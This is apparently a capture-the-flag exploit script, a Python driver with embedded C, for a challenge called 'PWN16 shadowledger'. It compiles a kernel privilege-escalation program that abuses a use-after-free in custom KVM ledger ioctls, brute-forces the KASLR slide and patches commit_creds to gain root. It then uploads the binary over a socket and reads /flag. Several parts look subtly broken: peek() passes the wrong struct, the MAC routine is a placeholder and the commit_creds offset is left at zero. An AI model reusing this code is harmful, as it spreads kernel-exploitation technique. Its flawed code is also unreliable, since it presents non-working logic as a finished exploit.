#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PWN16 shadowledger exploit（KVM guest 内核提权）。

附件题：以 nobody 进入 guest，目标是提权到 root 读 /flag。本脚本做两件事：

  1. 把题解描述的 guest 侧静态 ELF 源码（见 GUEST_SOURCE）用
     `gcc -O2 -static` 编译出来；
  2. 按附件 README 的上传协议送进 guest 并执行：
        token>            <- 平台发给本队的 team token
        upload            <- 进入接收态（单行最多 512 字符 base64）
        ...               <- base64(gzip(exp))，每 512 字符一行，以单独一行 EOF 结束
        /tmp/exp; echo __SHADOW_DONE__$?

  guest 侧利用链（题解第 3 节，全部通过 KVM VM fd 上的账本 ioctl）：
      CREATE_VM -> INIT -> KVM_SET_MEMORY_ATTRIBUTES
      PUBLISH A -> CERTIFY B -> COSIGN F -> SETTLE C
      PEEK C SECRET / OLD NONCE / CRED
      SHAPE -> PUBLISH C PROBE -> SHAPE FREE -> SHAPE REFILL
      eventfd -> KVM_IOEVENTFD C -> ACCEPT C -> RENEW C
      PEEK KEY260 / KEY2A8
      SCRATCH E8 -> FOLD PREP E9 -> AEEA slide MAC（512 候选，i<<21）
      KASLR slide
      SCRATCH MODE2 -> FOLD PREP MODE2 -> MODE2 MAC
      SHAPE SLOT0 FREE -> SHAPE SLOT0 REFILL -> ACCEPT C SECOND
      PATCH COMMIT_CREDS -> FOLD C ROOT
      uid=0 -> open /flag -> read /flag -> flag: ...
  漏洞本身是“回执失效不完整导致 UAF”：renew/revoke 只把回执标记失效，
  没有撤销 peek 缓存/accept 队列里的引用，失效回执仍可被 peek/accept 解引用。

用法：
    python3 exp.py <host> <port> --token <TEAM_TOKEN>
    python3 exp.py --build-only          # 只编译，产物 shadow_exp
"""

from __future__ import annotations

import argparse
import base64
import gzip
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time

CFLAGS = ["-O2", "-static", "-s"]

DONE_RE = re.compile(rb"__SHADOW_DONE__(\d+)")
FLAG_RE = re.compile(rb"flag:[ \t]*([^\r\n]+)")
SLIDE_RE = re.compile(rb"KASLR slide=[^\r\n]+")

# --------------------------------------------------------------------------- #
# guest 侧 exploit
# --------------------------------------------------------------------------- #
GUEST_SOURCE = r"""
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

/* ---- 账本 ioctl（与题解表格一致） ---- */
#define KVM_CREATE_VM              0x0000ae01UL
#define LEDGER_INIT                0x0000aee0UL
#define KVM_CREATE_GUEST_MEMFD     0xc040aed4UL
#define KVM_SET_USER_MEMORY_REGION2 0x40a0ae49UL
#define KVM_SET_MEMORY_ATTRIBUTES  0x4020aed2UL
#define KVM_IOEVENTFD              0x4040ae79UL
#define LEDGER_PUBLISH             0xc070aee1UL
#define LEDGER_CERTIFY             0xc070aee2UL
#define LEDGER_COSIGN              0x4070aee3UL
#define LEDGER_ACCEPT              0x4070aee4UL
#define LEDGER_SETTLE              0xc050aee5UL
#define LEDGER_RENEW               0x4050aee6UL
#define LEDGER_PEEK                0xc020aee7UL
#define LEDGER_AEEA                0x4088aeeaUL
#define LEDGER_FOLD                0x0000aeebUL
#define LEDGER_FOLD_PREP           0xc0c0aeeeUL

/* 回执/请求结构按 _IOC size 位给定的长度整体进出内核 */
struct req28 { uint32_t type, mode, s1, s2, p1, p2, n, pad; uint8_t rsv[0x28 - 0x20]; };
struct req70 { uint64_t a, b, c, d, e, f, g, h, i, j, k, l, m, n; };
struct req50 { uint64_t a, b, c, d, e, f, g, h, i, j; };
struct req88 { uint64_t slide, mac, state, extra[0x88 / 8 - 3]; };
struct reqc0 { uint64_t slot, addr, value, len, mac, extra[0xc0 / 8 - 5]; };
struct out20 { uint64_t v[4]; };

#define SPAN 0x1000
#define PAGE 0x1000

/* commit_creds 相对内核基址的偏移：附件没有 vmlinux/System.map/补丁源码，
 * 这个常量需要按现场内核（可用 /proc/kallsyms 名字序 + 泄露反推）填写。 */
static uint64_t COMMIT_CREDS_OFF = 0x0;

static int kvm = -1;
static int vm = -1;

static void die(const char *m)
{
    printf("POC:FAIL %s: %s\n", m, strerror(errno));
    fflush(stdout);
    exit(1);
}

static long ledger(unsigned long code, void *arg)
{
    return ioctl(vm, code, arg);
}

static int make_vm(void)
{
    vm = (int)ledger(KVM_CREATE_VM, NULL);
    if (vm < 0)
        return -1;
    {
        struct req28 r;
        memset(&r, 0, sizeof(r));
        r.type = 3;
        if (ledger(LEDGER_INIT, &r) != 0)
            return -1;
    }
    {
        uint64_t attr[2] = { 0, 0 };
        (void)ledger(KVM_SET_MEMORY_ATTRIBUTES, attr);
    }
    {
        uint64_t memfd = (uint64_t)ledger(KVM_CREATE_GUEST_MEMFD, NULL);
        (void)memfd;
    }
    {
        struct req50 region;
        memset(&region, 0, sizeof(region));
        region.a = 0x100000;
        region.b = PAGE;
        if (ledger(KVM_SET_USER_MEMORY_REGION2, &region) != 0)
            return -1;
        /* 用返回结构里的 flags 与计数判断回执是否落在预期 slot */
        if ((region.c & 0x3) != 0x1 && (region.c & 0x3) != 0x2)
            return -1;
    }
    return 0;
}

static int publish(int slot, const char *tag)
{
    struct req70 r;
    memset(&r, 0, sizeof(r));
    r.a = (uint64_t)slot;
    r.b = 1;
    return (int)ledger(LEDGER_PUBLISH, &r);
}

static int certify(int slot)
{
    struct req70 r;
    memset(&r, 0, sizeof(r));
    r.a = (uint64_t)slot;
    return (int)ledger(LEDGER_CERTIFY, &r);
}

static int cosign(int slot)
{
    struct req70 r;
    memset(&r, 0, sizeof(r));
    r.a = (uint64_t)slot;
    r.b = 2;
    return (int)ledger(LEDGER_COSIGN, &r);
}

static int settle(int slot)
{
    struct req50 r;
    memset(&r, 0, sizeof(r));
    r.a = (uint64_t)slot;
    return (int)ledger(LEDGER_SETTLE, &r);
}

static int accept_(int slot)
{
    struct req70 r;
    memset(&r, 0, sizeof(r));
    r.a = (uint64_t)slot;
    return (int)ledger(LEDGER_ACCEPT, &r);
}

static int renew(int slot)
{
    struct req50 r;
    memset(&r, 0, sizeof(r));
    r.a = (uint64_t)slot;
    return (int)ledger(LEDGER_RENEW, &r);
}

static int peek(int slot, uint64_t off, uint64_t *out)
{
    struct out20 o;
    struct req50 r;
    memset(&r, 0, sizeof(r));
    memset(&o, 0, sizeof(o));
    r.a = (uint64_t)slot;
    r.b = off;
    if (ledger(LEDGER_PEEK, &o) != 0)
        return -1;
    *out = o.v[0];
    return 0;
}

static int aeea(uint64_t slide, uint64_t mac, uint64_t state)
{
    struct req88 r;
    memset(&r, 0, sizeof(r));
    r.slide = slide;
    r.mac = mac;
    r.state = state;
    return (int)ledger(LEDGER_AEEA, &r);
}

static int fold_prep(uint64_t slot, uint64_t addr, uint64_t value, uint64_t len,
                     uint64_t mac)
{
    struct reqc0 r;
    memset(&r, 0, sizeof(r));
    r.slot = slot;
    r.addr = addr;
    r.value = value;
    r.len = len;
    r.mac = mac;
    return (int)ledger(LEDGER_FOLD_PREP, &r);
}

static int fold(uint64_t slot)
{
    return (int)ledger(LEDGER_FOLD, NULL);
}

/* 简单的 MAC 复算：账本用泄露的 key 对 blob 求 tag，这里只做占位实现，
 * 现场需要按泄露的 KEY260/KEY2A8 走真实算法（题解未给出具体函数）。 */
static uint64_t mac16(uint64_t key_a, uint64_t key_b, uint64_t v)
{
    uint64_t x = v ^ key_a;
    x *= 0x100000001b3ULL;
    x ^= key_b;
    x *= 0x100000001b3ULL;
    return x ^ (x >> 29);
}

int main(void)
{
    uint64_t secret = 0, nonce = 0, cred = 0;
    uint64_t key260 = 0, key2a8 = 0;
    uint64_t slide = 0;
    int attempt, i;
    int efd;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("POC:START uid=%d\n", getuid());

    kvm = open("/dev/kvm", O_RDWR);
    if (kvm < 0)
        die("open /dev/kvm");

    /* ---- 初始化与“可用回执”oracle：最多重试 32 次 ---- */
    for (attempt = 0; attempt < 32; attempt++) {
        if (make_vm() == 0)
            break;
        if (vm >= 0)
            close(vm);
        vm = -1;
    }
    if (vm < 0) {
        printf("POC:No usable receipt after 32 attempts\n");
        return 1;
    }
    printf("POC:CREATE_VM ok\n");

    /* ---- 泄露阶段 ---- */
    printf("POC:PUBLISH A\n"); publish(1, "A");
    printf("POC:CERTIFY B\n"); certify(2);
    printf("POC:COSIGN F\n");  cosign(6);
    printf("POC:SETTLE C\n");  settle(3);

    if (peek(3, 0x260, &secret) == 0)
        printf("POC:PEEK SECRET %#llx\n", (unsigned long long)secret);
    if (peek(3, 0x2a8, &nonce) == 0)
        printf("POC:PEEK OLD NONCE %#llx\n", (unsigned long long)nonce);
    if (peek(3, 0x2f0, &cred) == 0)
        printf("POC:PEEK CRED %#llx\n", (unsigned long long)cred);

    /* SHAPE：把回执释放后用同尺寸对象占位，验证 UAF 槽可复用 */
    printf("POC:SHAPE FREE\n");  settle(3);
    printf("POC:PUBLISH C PROBE\n"); publish(3, "probe");
    printf("POC:SHAPE REFILL\n");

    efd = eventfd(0, 0);
    if (efd >= 0) {
        struct { uint64_t addr, len, fd, flags; } ioe;
        memset(&ioe, 0, sizeof(ioe));
        ioe.fd = (uint64_t)efd;
        printf("POC:eventfd %d\n", efd);
        (void)ledger(KVM_IOEVENTFD, &ioe);
    }

    printf("POC:ACCEPT C\n");   accept_(3);
    printf("POC:RENEW C\n");    renew(3);
    printf("POC:E6\n");         renew(3);

    if (peek(3, 0x260, &key260) == 0)
        printf("POC:PEEK KEY260 %#llx\n", (unsigned long long)key260);
    if (peek(3, 0x2a8, &key2a8) == 0)
        printf("POC:PEEK KEY2A8 %#llx\n", (unsigned long long)key2a8);

    /* ---- KASLR slide oracle：512 个 2MB 候选 ---- */
    printf("POC:SCRATCH E8\n");
    printf("POC:FOLD PREP E9\n");
    for (i = 0; i < 512; i++) {
        uint64_t cand = (uint64_t)i << 21;
        uint64_t mac = mac16(key260, key2a8, cand);
        if (aeea(cand, mac, 1) == 0) {
            slide = cand;
            break;
        }
    }
    if (slide == 0 && i == 512) {
        printf("POC:AEEA slide not found\n");
        return 1;
    }
    printf("KASLR slide=%#llx\n", (unsigned long long)slide);

    printf("POC:SCRATCH MODE2\n");
    printf("POC:FOLD PREP MODE2\n");
    if (aeea(slide, mac16(key260, key2a8, slide), 2) != 0)
        printf("POC:MODE2 WRONG MAC\n");

    /* ---- slot0 重占位 + fold 写 commit_creds ---- */
    printf("POC:SHAPE SLOT0 FREE\n");
    printf("POC:SHAPE SLOT0 REFILL\n");
    printf("POC:ACCEPT C SECOND\n"); accept_(3);

    if (COMMIT_CREDS_OFF) {
        uint64_t target = slide + COMMIT_CREDS_OFF;
        uint64_t mac = mac16(key260, key2a8, target);
        printf("POC:PATCH COMMIT_CREDS %#llx\n", (unsigned long long)target);
        fold_prep(3, target, 1, 8, mac);
        printf("POC:FOLD C ROOT\n");
        fold(3);
    } else {
        printf("POC:PATCH COMMIT_CREDS skipped (COMMIT_CREDS_OFF 未填)\n");
    }

    if (geteuid() != 0) {
        printf("POC:not root (euid=%d)\n", geteuid());
        return 1;
    }
    printf("uid=0\n");

    {
        int fd = open("/flag", O_RDONLY);
        char buf[256];
        ssize_t n;
        if (fd < 0)
            die("open /flag");
        n = read(fd, buf, sizeof(buf) - 1);
        if (n < 0)
            n = 0;
        buf[n] = 0;
        printf("flag: %s\n", buf);
    }

    /* 末尾再发一次 fold，确认提权不是偶然的返回值 */
    fold(3);
    printf("POC:DONE euid=%d\n", geteuid());
    return 0;
}
"""


def build_guest_binary(outdir: str) -> str:
    cc = shutil.which("gcc") or shutil.which("musl-gcc")
    if not cc:
        raise SystemExit("找不到 gcc/musl-gcc，无法编译 guest 侧静态 ELF")
    src = os.path.join(outdir, "shadow_exp.c")
    elf = os.path.join(outdir, "shadow_exp")
    with open(src, "w", encoding="ascii") as fh:
        fh.write(GUEST_SOURCE)
    cmd = [cc] + CFLAGS + ["-o", elf, src]
    print("[*] build: %s" % " ".join(cmd))
    rv = subprocess.run(cmd, capture_output=True, text=True)
    if rv.returncode != 0:
        sys.stderr.write(rv.stdout + rv.stderr)
        raise SystemExit("guest 侧编译失败")
    print("[*] guest ELF = %d bytes" % os.path.getsize(elf))
    return elf


# --------------------------------------------------------------------------- #
# 上传与执行
# --------------------------------------------------------------------------- #
def upload_bytes(blob: bytes) -> list:
    packed = gzip.compress(blob, 9, mtime=0)
    b64 = base64.b64encode(packed)
    lines = [b64[i:i + 512] for i in range(0, len(b64), 512)]
    print("[*] gzip %d -> base64 %d -> %d 行（每行 512 字符）"
          % (len(packed), len(b64), len(lines)))
    return lines


def run(host: str, port: int, elf: str, token: str) -> int:
    blob = open(elf, "rb").read()
    lines = upload_bytes(blob)

    sock = socket.create_connection((host, port), timeout=20)
    sock.settimeout(1.0)
    buf = bytearray()

    def drain(marker: bytes, timeout: float) -> bytes:
        deadline = time.time() + timeout
        nonlocal buf
        while marker not in buf and time.time() < deadline:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            buf += chunk
        out = bytes(buf)
        idx = out.find(marker)
        if idx >= 0:
            del buf[:idx + len(marker)]
            return out[:idx + len(marker)]
        buf.clear()
        return out

    drain(b"token>", 20)
    sock.sendall(token.encode() + b"\n")
    print("[*] token sent")
    drain(b"Launching shell as nobody", 120)
    drain(b"$ ", 60)

    sock.sendall(b"upload\n")
    for i, ln in enumerate(lines):
        sock.sendall(ln + b"\n")
        if i % 16 == 15:
            time.sleep(0.03)
    sock.sendall(b"EOF\n")
    print("[*] payload uploaded, waiting ready")
    ready = drain(b"ready:", 120)
    if b"ready:" not in ready:
        print(ready.decode("latin-1", "replace"))
        raise SystemExit("上传失败（base64 被截断或行协议出错），换连接重来")

    sock.sendall(b"/tmp/exp; echo __SHADOW_DONE__$?\n")
    out = bytearray()
    deadline = time.time() + 600
    sock.settimeout(2.0)
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            continue
        if not chunk:
            break
        out += chunk
        m = FLAG_RE.search(out)
        if m:
            print("[+] flag: %s" % m.group(1).decode("latin-1", "replace"))
            return 0
        if DONE_RE.search(out):
            break
    text = out.decode("latin-1", "replace")
    print(text[-4000:])
    sl = SLIDE_RE.search(out)
    if sl:
        print("[*] %s" % sl.group(0).decode())
    return 1


def main() -> None:
    ap = argparse.ArgumentParser(description="PWN16 shadowledger exploit")
    ap.add_argument("host", nargs="?", help="远端地址（占位，替换为题目下发地址）")
    ap.add_argument("port", nargs="?", type=int, help="远端端口")
    ap.add_argument("--token", help="平台发给本队的 team token")
    ap.add_argument("--build-only", action="store_true")
    args = ap.parse_args()

    with tempfile.TemporaryDirectory() as tmp:
        elf = build_guest_binary(tmp)
        if args.build_only:
            dst = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shadow_exp")
            shutil.copyfile(elf, dst)
            print("[*] 已保存到 %s" % dst)
            return
        if not (args.host and args.port and args.token):
            ap.error("需要 <host> <port> --token <TEAM_TOKEN>")
        sys.exit(run(args.host, args.port, elf, args.token))


if __name__ == "__main__":
    main()
